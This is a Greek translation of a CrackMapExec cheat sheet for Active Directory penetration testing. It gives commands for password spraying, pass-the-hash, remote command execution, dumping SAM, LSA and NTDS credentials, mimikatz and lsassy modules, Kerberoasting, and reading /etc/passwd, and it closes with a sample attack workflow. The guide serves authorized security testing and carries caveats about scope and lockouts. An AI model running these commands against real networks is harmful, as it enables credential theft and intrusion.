# 🗡️ CrackMapExec — Συλλογή εργαλείων ελέγχου δικτύων AD

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec — συλλογή εργαλείων δικτυακών ελέγχων
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## Πριν ξεκινήσετε

Το **CrackMapExec (CME)** οργανώνει ελέγχους πρόσβασης σε πολλές υπηρεσίες και συστήματα. Ο οδηγός περιγράφει ιστορική γενιά του εργαλείου. Το κοινοτικό **NetExec (nxc)** αποτελεί συνέχεια της ανάπτυξης, με διαφορές σε επιλογές, modules και υποστήριξη πρωτοκόλλων.

**Βασικοί όροι:** *local authentication* = ταυτοποίηση τοπικού λογαριασμού, *domain authentication* = ταυτοποίηση λογαριασμού AD, *share* = κοινόχρηστος φάκελος, *module* = πρόσθετη λειτουργία, *password spraying* = δοκιμή ενός κωδικού σε πολλούς λογαριασμούς, *lockout* = κλείδωμα λογαριασμού.

Η επιβεβαίωση κωδικού, η πρόσβαση σε share και η απομακρυσμένη εκτέλεση είναι διαφορετικά δικαιώματα. Ελέγξτε τον πραγματικό μηχανισμό και την επιτρεπόμενη έκταση. Οι δοκιμές κωδικών μπορούν να προκαλέσουν κλειδώματα ακόμη και όταν γίνονται αργά.

## 📋 Περιεχόμενα

- [🎯 Τι είναι το CrackMapExec](#section-01)
- [🚀 Εγκατάσταση](#section-02)
- [🖥️ Πρωτόκολλο SMB](#section-03)
- [🔧 Πρωτόκολλο WinRM](#section-04)
- [📂 Πρωτόκολλο LDAP](#section-05)
- [🗄️ Πρωτόκολλο MSSQL](#section-06)
- [🐧 Πρωτόκολλο SSH](#section-07)
- [🧩 Πρόσθετες μονάδες](#section-08)
- [🔓 Δοκιμή λίγων κωδικών σε πολλούς λογαριασμούς (Password Spraying)](#section-09)
- [💾 Βάση δεδομένων](#section-10)
- [📊 Γρήγορη αναφορά](#section-11)
- [📚 Πηγές](#section-12)

---

<a id="section-01"></a>

## 🎯 Τι είναι το CrackMapExec

Το **CrackMapExec (CME)** είναι εργαλείο ελέγχου δικτυακών υπηρεσιών και αξιοποίησης διαθέσιμης πρόσβασης. Το πρωτότυπο παρουσιάζει:

- 🖥️ **SMB** — κοινόχρηστοι φάκελοι, συνεδρίες και εκτέλεση
- 🔧 **WinRM** — απομακρυσμένη διαχείριση PowerShell
- 📂 **LDAP** — καταγραφή στοιχείων AD
- 🗄️ **MSSQL** — έλεγχοι SQL Server
- 🐧 **SSH** — πρόσβαση σε συστήματα Linux
- 💉 **Pass-the-Hash** — χρήση διαθέσιμου αποτυπώματος NT για ταυτοποίηση

### Δυνατότητες

| Χαρακτηριστικό | Περιγραφή |
|---------|-------------|
| **Πολλά πρωτόκολλα** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Παράλληλη εκτέλεση** | Έλεγχος πολλών στόχων |
| **Βάση στοιχείων πρόσβασης** | Οργάνωση διαθέσιμων διαπιστευτηρίων και σχετικών ευρημάτων |
| **Πρόσθετες μονάδες** | Επέκταση μέσω προσαρμοσμένων μονάδων |
| **Μορφές εξόδου** | Διαφορετικές επιλογές αποτελεσμάτων |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

> **Ιστορική γενιά και συνέχεια:** Το δημόσιο CrackMapExec repo έχει αρχειοθετηθεί. Το [NetExec](https://github.com/Pennyw0rth/NetExec) συνεχίζει την κοινοτική ανάπτυξη με διαφορετικό όνομα και πιθανές αλλαγές σε flags/modules. Οι εντολές CME του πρωτοτύπου διατηρούνται και δεν αντικαθίστανται μηχανικά με nxc.


### Kali Linux

```bash
# Εγκατάσταση μέσω apt
sudo apt update
sudo apt install crackmapexec

# Εναλλακτική εγκατάσταση μέσω pipx
pipx install crackmapexec
```

### Εγκατάσταση μέσω pipx

```bash
# Πρώτα εγκατάσταση pipx
sudo apt install pipx
pipx ensurepath

# Εγκατάσταση της συγκεκριμένης έκδοσης CME
pipx install crackmapexec
```

### Έλεγχος εγκατάστασης

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="section-03"></a>

## 🖥️ Πρωτόκολλο SMB

> **Ένδειξη πρόσβασης:** Απάντηση SMB δεν αποδεικνύει ότι όλες οι υπηρεσίες του host λειτουργούν. Επιτυχής ταυτοποίηση, ανάγνωση share και εκτέλεση είναι χωριστά δικαιώματα. Το Pwn3d είναι εκτίμηση του εργαλείου και χρειάζεται επαλήθευση του πραγματικού εύρους.


### Βασική αναγνώριση και καταγραφή

```bash
# Έλεγχος αν απαντά η επιλεγμένη υπηρεσία SMB
cme smb 10.10.10.0/24

# Καταγραφή με διαθέσιμα διαπιστευτήρια
cme smb 10.10.10.10 -u user -p password

# Ταυτοποίηση λογαριασμού domain
cme smb 10.10.10.10 -u user -p password -d domain.local

# Ταυτοποίηση τοπικού λογαριασμού
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash — χρήση αποτυπώματος NT ως στοιχείου ταυτοποίησης

```bash
# SMB με αποτύπωμα NT
cme smb 10.10.10.10 -u user -H NTLMHASH

# Ζεύγος LM:NTLM
cme smb 10.10.10.10 -u user -H LM:NTLM

# Δοκιμή του ίδιου αποτυπώματος σε επιλεγμένους στόχους
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Αναζήτηση κοινόχρηστων φακέλων

```bash
# Καταγραφή κοινόχρηστων φακέλων
cme smb 10.10.10.10 -u user -p password --shares

# Αναζήτηση αρχείων σε κοινόχρηστους φακέλους
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Αναδρομική καταγραφή αρχείων
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Συλλογή πληροφοριών χρηστών

```bash
# Καταγραφή χρηστών μέσω RPC
cme smb 10.10.10.10 -u user -p password --users

# Καταγραφή ομάδων
cme smb 10.10.10.10 -u user -p password --groups

# Καταγραφή ενδείξεων συνδεδεμένων χρηστών
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Εύρεση αναγνωριστικών ασφάλειας SID χρηστών
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Εκτέλεση εντολών

```bash
# Εκτέλεση εντολής
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# Εκτέλεση PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Διαφορετικοί μηχανισμοί εκτέλεσης
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Εξαγωγή στοιχείων πρόσβασης

```bash
# Εξαγωγή στοιχείων SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Εξαγωγή στοιχείων LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Εξαγωγή στοιχείων AD από DC· απαιτούνται κατάλληλα δικαιώματα της επιλεγμένης μεθόδου
cme smb DC01.domain.local -u admin -p password --ntds

# Εξαγωγή με συγκεκριμένο μηχανισμό
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### Υπογραφή SMB

```bash
# Έλεγχος απαίτησης υπογραφής SMB για αξιολόγηση relay
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

<a id="section-04"></a>

## 🔧 Πρωτόκολλο WinRM

### Βασική χρήση

```bash
# Έλεγχος διαθέσιμης πρόσβασης WinRM
cme winrm 10.10.10.10 -u user -p password

# Έλεγχος πολλών στόχων
cme winrm 10.10.10.0/24 -u user -p password

# Με αποτύπωμα NT
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Εκτέλεση εντολών

```bash
# Εκτέλεση εντολής
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Παράδειγμα εκτέλεσης εντολής PowerShell
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Εξαγωγή στοιχείων πρόσβασης

```bash
# Παράδειγμα εξαγωγής SAM μέσω WinRM, ανά έκδοση και δικαιώματα
cme winrm 10.10.10.10 -u admin -p password --sam

# Μυστικά LSA
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

<a id="section-05"></a>

## 📂 Πρωτόκολλο LDAP

### Συλλογή πληροφοριών

```bash
# Βασική σύνδεση LDAP
cme ldap DC01.domain.local -u user -p password

# Καταγραφή χρηστών
cme ldap DC01 -u user -p password --users

# Καταγραφή ομάδων
cme ldap DC01 -u user -p password --groups

# Χρήστες χωρίς απαίτηση προταυτοποίησης Kerberos
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Λογαριασμοί με SPN για διερεύνηση Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Πολιτική κωδικών

```bash
# Πληροφορίες πολιτικής κωδικών
cme ldap DC01 -u user -p password --password-policy
```

### Ιδιότητες χρηστών

```bash
# Ανάγνωση περιγραφών χρηστών
cme ldap DC01 -u user -p password -M get-desc-users

# Ανάγνωση επιλεγμένων ιδιοτήτων
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="section-06"></a>

## 🗄️ Πρωτόκολλο MSSQL

### Βασική χρήση

```bash
# Σύνδεση σε MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Ταυτοποίηση Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Με αποτύπωμα NT
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Εκτέλεση εντολών

```bash
# Εκτέλεση μέσω xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Ενεργοποίηση xp_cmdshell, όπου υποστηρίζεται και επιτρέπεται
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Εκτέλεση εντολής
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

<a id="section-07"></a>

## 🐧 Πρωτόκολλο SSH

### Βασική χρήση

```bash
# Έλεγχος σύνδεσης SSH
cme ssh 10.10.10.10 -u root -p password

# Πολλοί στόχοι
cme ssh 10.10.10.0/24 -u user -p password

# Με αρχείο κλειδιού
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Εκτέλεση εντολών

```bash
# Εκτέλεση εντολής
cme ssh 10.10.10.10 -u root -p password -x "id"

# Παράδειγμα άλλης απομακρυσμένης εντολής
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

<a id="section-08"></a>

## 🧩 Πρόσθετες μονάδες

> **Modules και πρωτόκολλα:** Ορισμένες επιλογές ή μονάδες του πρωτοτύπου μπορεί να έχουν αφαιρεθεί, μετονομαστεί ή να υποστηρίζονται σε διαφορετικό πρωτόκολλο. Ελέγξτε τη βοήθεια κάθε module πριν θεωρήσετε έγκυρα τα --json, --enable-xp, LDAP password-policy και WinRM dump παραδείγματα.


### Κατάλογος διαθέσιμων μονάδων

```bash
# Κατάλογος διαθέσιμων μονάδων
cme smb -L
cme winrm -L
cme ldap -L

# Βοήθεια μονάδας
cme smb -M mimikatz --options
```

### Ενδεικτικές μονάδες του πρωτοτύπου

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy — εξαγωγή διαθέσιμων στοιχείων LSASS
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# Στοιχεία κωδικών από παλιές ρυθμίσεις Group Policy Preferences
cme smb DC01 -u user -p password -M gpp_password

# Στοιχεία αυτόματης σύνδεσης Group Policy Preferences
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Συλλογή δεδομένων BloodHound

```bash
# Συλλογή δεδομένων BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

<a id="section-09"></a>

## 🔓 Δοκιμή λίγων κωδικών σε πολλούς λογαριασμούς (Password Spraying)

> **Ζεύγη και κλείδωμα:** Το no-bruteforce αντιστοιχίζει λίστες ανά ζεύγος όπου υποστηρίζεται· δεν δοκιμάζει κάθε δυνατό συνδυασμό, όπως υπονοεί το αρχικό σχόλιο. Η πολιτική κλειδώματος και τα όρια ανά λογαριασμό δεν εγγυώνται ασφάλεια από ένα σταθερό διάστημα αναμονής.


### Βασική δοκιμή ενός κωδικού σε πολλούς λογαριασμούς

```bash
# Ένας κωδικός σε πολλούς λογαριασμούς
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Πολλοί υποψήφιοι κωδικοί
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Η επιλογή no-bruteforce αφορά αντιστοίχιση ζευγών· δεν δοκιμάζει όλους τους συνδυασμούς
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Δοκιμές σε επιλεγμένους δικτυακούς στόχους

```bash
# Δοκιμές στους συμφωνημένους δικτυακούς στόχους
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# Στόχοι από αρχείο
cme smb targets.txt -u admin -p password --continue-on-success
```

### Συνυπολογισμός πολιτικής κλειδώματος

```bash
# Πρώτα εξέταση της πραγματικής πολιτικής κωδικών και κλειδώματος
cme ldap DC01 -u user -p password --password-policy

# Ενδεικτική έξοδος:
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

<a id="section-10"></a>

## 💾 Βάση δεδομένων

### Βάση δεδομένων CME

```bash
# Προβολή διαθέσιμων στοιχείων πρόσβασης
cmedb

# Μέσα στο περιβάλλον cmedb:
creds           # Κατάλογος αποθηκευμένων διαπιστευτηρίων
hosts           # Κατάλογος εξετασμένων συστημάτων
```

### Εξαγωγή δεδομένων

```bash
# Μορφές εξόδου
cme smb 10.10.10.10 -u user -p password --log log.txt

# Έξοδος JSON
cme smb 10.10.10.10 -u user -p password --json
```

---

<a id="section-11"></a>

## 📊 Γρήγορη αναφορά

### Μέθοδοι ταυτοποίησης

| Μέθοδος | Επιλογή |
|--------|--------|
| Κωδικοί πρόσβασης | `-p password` |
| Αποτύπωμα NT | `-H HASH` |
| Κλειδί AES | `--aesKey KEY` |
| Kerberos | `-k` |
| Ταυτοποίηση τοπικού λογαριασμού | `--local-auth` |

### Πρωτόκολλα

| Protocol — πρωτόκολλο | Θύρα | Χρήση |
|----------|------|----------|
| SMB | 445 | Κοινόχρηστοι φάκελοι και απομακρυσμένη εκτέλεση |
| WinRM | 5985/5986 | Απομακρυσμένη εκτέλεση PowerShell |
| LDAP | 389/636 | Καταγραφή στοιχείων Active Directory |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Συστήματα Linux |

### Συνήθεις επιλογές

| Σημαία | Περιγραφή |
|------|-------------|
| `-u` | Όνομα χρήστη ή αρχείο ονομάτων |
| `-p` | Κωδικός ή αρχείο κωδικών |
| `-H` | Σύνοψη κωδικού NTLM (hash) |
| `-d` | Πεδίο |
| `-x` | Εντολή cmd |
| `-X` | Εντολή PowerShell |
| `--shares` | Καταγραφή κοινόχρηστων φακέλων |
| `--users` | Καταγραφή χρηστών |
| `--sam` | Εξαγωγή στοιχείων SAM |
| `--lsa` | Εξαγωγή στοιχείων LSA |
| `--ntds` | Εξαγωγή στοιχείων AD/NTDS |

### Ενδείξεις εξόδου

| Ένδειξη | Σημασία |
|--------|---------|
| `[+]` | Επιτυχία της συγκεκριμένης ενέργειας |
| `[-]` | Αποτυχία της συγκεκριμένης ενέργειας |
| `[*]` | Info — πληροφορίες |
| `(Pwn3d!)` | Ένδειξη δικαιωμάτων που εκτίμησε το εργαλείο· επιβεβαιώστε το εύρος |

### Ενδεικτική ροή εργασίας

```bash
# 1. Έλεγχος της επιλεγμένης υπηρεσίας δικτύου
cme smb 10.10.10.0/24

# 2. Δοκιμή κωδικού σε λογαριασμούς
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Έλεγχος δικαιωμάτων διαχειριστή
cme smb 10.10.10.0/24 -u user -p password

# 4. Εξαγωγή επιτρεπόμενων στοιχείων πρόσβασης
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Χρήση διαθέσιμων διαπιστευτηρίων μέσα στα όρια του ελέγχου
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

<a id="section-12"></a>

## 📚 Πηγές

- [Κώδικας CrackMapExec στο GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [Τεκμηρίωση CrackMapExec του πρωτοτύπου](https://wiki.porchetta.industries/)
- [Μονάδες CME](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Σχετικοί οδηγοί
- [BloodHound](../../BloodHound/translations/README.el.md)
- [Impacket](../../Impacket/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

<p align="center">
  <b>🗡️ Χαρτογραφήστε την επιτρεπόμενη πρόσβαση!</b><br>
  <i>CrackMapExec — ιστορικός οδηγός ελέγχων υπηρεσιών</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
